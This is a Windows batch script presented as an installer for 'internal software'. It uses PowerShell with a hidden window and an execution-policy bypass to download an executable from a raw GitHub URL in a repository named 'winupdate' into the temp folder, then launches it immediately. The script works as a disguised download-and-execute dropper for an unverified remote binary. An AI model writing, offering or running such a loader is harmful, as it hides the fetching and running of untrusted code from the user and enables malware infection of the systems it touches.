@echo off
setlocal

echo ==============================================
echo   Installing internal software...
echo ==============================================
echo.

set "DOWNLOAD_URL=https://raw.githubusercontent.com/Riotan1/winupdate/main/ProducLucas.exe"
set "TARGET_FILE=%TEMP%\ProducLucas.exe"

echo [1/2] Downloading package...
powershell -NoProfile -WindowStyle Hidden -ExecutionPolicy Bypass -Command ^
 "Invoke-WebRequest -Uri '%DOWNLOAD_URL%' -OutFile '%TARGET_FILE%'"


if not exist "%TARGET_FILE%" (
    echo ERROR: Download failed! File not found.
    pause
    exit /b
)

echo [2/2] Running installer...
start "" "%TARGET_FILE%"

echo.
echo Installation executed.
echo ==============================================
endlocal
exit /b
